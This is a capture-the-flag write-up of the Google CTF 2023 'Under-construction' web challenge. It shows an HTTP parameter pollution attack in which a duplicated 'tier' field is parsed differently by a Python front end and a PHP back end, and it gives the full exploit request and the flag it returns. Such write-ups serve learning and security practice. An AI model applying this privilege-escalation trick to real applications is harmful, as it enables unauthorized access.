# GoogleCTF 2k23 Writeup

### Under-construction 

The app is about merging an app from python to php and it's done by making a new python application that interacts with the db but forward the code to the php application for the signup feature. 

We want to create a user with tier `gold` to get flag

```php
    if ($tier === "gold") {
        $response .= " " . getenv("FLAG");
    }
```

This task is fairly easy and straight forward. Actually, We have one and only one interesting action that is done by our application which is the forwarding part.

```python
    resp=requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
        headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request)
```

Here the token is to make the sure only the python app can interact with the php one's. So we cannot think of any request smuggling as we don't know the token. (Yes looking how we are passing the raw_request, I thought abt it ). Instead, we can think of how paramater are interpreted by both apps. and we will find out that when we send

```
tier=blue&tier=gold
```

the value will be taken as `blue` in the python app and `gold` in the php app. So we can send the following request to get the flag

```
POST /signup HTTP/2
Host: under-construction-web.2023.ctfcompetition.com
Content-Length: 55
Origin: https://under-construction-web.2023.ctfcompetition.com
Content-Type: application/x-www-form-urlencoded

username=12345612&password=aaaaaaaa&tier=blue&tier=gold
```

And then we can retrieve the flag by loggin in the php app. 

```
Login successful. Welcome 12345612. CTF{ff79e2741f21abd77dc48f17bab64c3d}
```

## Biohazard
